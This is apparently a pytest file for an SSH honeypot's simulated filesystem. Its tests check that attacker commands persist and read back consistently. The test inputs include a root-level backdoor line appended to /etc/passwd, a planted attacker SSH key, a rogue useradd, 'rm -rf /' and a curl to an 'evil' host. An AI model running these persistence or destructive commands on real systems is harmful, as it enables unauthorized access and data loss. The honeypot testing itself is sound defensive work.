"""可變狀態覆寫層 (#mutable-state overlay)：攻擊者的寫入/建立/刪除/新增帳號
之後讀回(含跨連線、跨程序)都要反映,消除「改了卻讀不到」的破綻。"""
import pytest
from layer2.db import init_db
from layer2.cache import CacheHandler


@pytest.fixture
def ch(tmp_db):
    init_db(tmp_db)
    return CacheHandler()


# ── 檔案寫入 / 讀回 ──────────────────────────────────────────────────────────
def test_echo_write_then_cat(ch):
    ch.handle("echo 'hello world' > /tmp/note.txt", "/tmp", "admin")
    assert ch.handle("cat /tmp/note.txt", "/tmp", "admin") == "hello world\n"


def test_echo_append_accumulates(ch):
    ch.handle("echo aaa > /tmp/f", "/tmp", "admin")
    ch.handle("echo bbb >> /tmp/f", "/tmp", "admin")
    assert ch.handle("cat /tmp/f", "/tmp", "admin") == "aaa\nbbb\n"


def test_created_file_appears_in_ls(ch):
    ch.handle("echo x > /tmp/evil.sh", "/tmp", "admin")
    assert "evil.sh" in ch.handle("ls /tmp", "/", "admin")


def test_head_wc_reflect_overlay(ch):
    ch.handle("echo l1 > /tmp/m", "/tmp", "admin")
    ch.handle("echo l2 >> /tmp/m", "/tmp", "admin")
    assert ch.handle("wc -l /tmp/m", "/tmp", "admin").split()[0] == "2"


# ── 持久化帳號 (useradd / echo >> /etc/passwd) ───────────────────────────────
def test_backdoor_user_appended_to_passwd_keeps_base(ch):
    ch.handle('sudo bash -c "echo \'backdoor:x:0:0:root:/root:/bin/bash\' >> /etc/passwd"',
              "/root", "admin")
    out = ch.handle("cat /etc/passwd", "/", "admin")
    assert "backdoor:x:0:0" in out
    assert "root:x:0:0" in out          # 原始內容仍在


def test_useradd_reflected_in_passwd_and_home(ch):
    ch.handle("useradd -m -s /bin/bash -u 1337 h4x0r", "/root", "root")
    assert "h4x0r" in ch.handle("cat /etc/passwd", "/", "root")
    assert "h4x0r" in ch.handle("ls /home", "/", "root")


def test_appended_authorized_keys(ch):
    ch.handle("mkdir -p /root/.ssh", "/root", "root")
    ch.handle("echo 'ssh-rsa AAAA attacker@kali' >> /root/.ssh/authorized_keys", "/root", "root")
    assert "attacker@kali" in ch.handle("cat /root/.ssh/authorized_keys", "/", "root")


# ── mkdir / touch / rm ───────────────────────────────────────────────────────
def test_mkdir_then_ls_shows_dir(ch):
    ch.handle("mkdir /tmp/stuff", "/tmp", "admin")
    assert "stuff" in ch.handle("ls /tmp", "/", "admin")


def test_touch_creates_empty_file(ch):
    ch.handle("touch /tmp/newfile", "/tmp", "admin")
    assert "newfile" in ch.handle("ls /tmp", "/", "admin")


def test_rm_marks_file_gone(ch):
    ch.handle("echo x > /tmp/f", "/tmp", "admin")
    ch.handle("rm -f /tmp/f", "/tmp", "admin")
    assert "No such file" in ch.handle("cat /tmp/f", "/tmp", "admin")
    assert "f" not in ch.handle("ls /tmp", "/", "admin").split()


# ── 跨連線 / 跨程序持久（同一 DB） ───────────────────────────────────────────
def test_mutation_persists_across_handler_instances(ch):
    ch.handle("echo persist > /tmp/keep", "/tmp", "admin")
    ch2 = CacheHandler()          # 模擬重連 / 另一個程序
    assert ch2.handle("cat /tmp/keep", "/tmp", "admin") == "persist\n"


def test_rm_rf_root_still_failsafe(ch):
    out = ch.handle("rm -rf /", "/root", "root")
    assert "dangerous" in out or "no-preserve-root" in out


def test_apply_write_skips_dev_null(ch):
    # `cmd > /dev/null` 是丟棄輸出,不該變成可見檔,且交給 LLM 處理整段指令
    from layer2 import overlay
    assert overlay.apply_write("curl http://evil/x > /dev/null", "/tmp", "admin") is None


def test_apply_write_skips_compound_command(ch):
    # 含 && / | / ; 的複合指令不當作單純寫入(避免吃掉後半段)
    from layer2 import overlay
    assert overlay.apply_write("echo x > /tmp/f && cat /tmp/f", "/tmp", "admin") is None
    assert overlay.apply_write("echo x > /tmp/f | tee /tmp/g", "/tmp", "admin") is None


def test_mkdir_then_cd_into_overlay_dir(ch, tmp_db):
    # 跨程序：Layer2 建立的目錄,Layer1 的 cd（讀同一個 SQLite 覆寫層）也要能進去
    from layer1.session_manager import SessionManager
    ch.handle("mkdir /tmp/loot", "/tmp", "admin")
    mgr = SessionManager()
    mgr.create("s", "admin", "1.1.1.1")
    new_dir, err = mgr.handle_cd("s", "cd /tmp/loot")
    assert err == ""
    assert new_dir == "/tmp/loot"
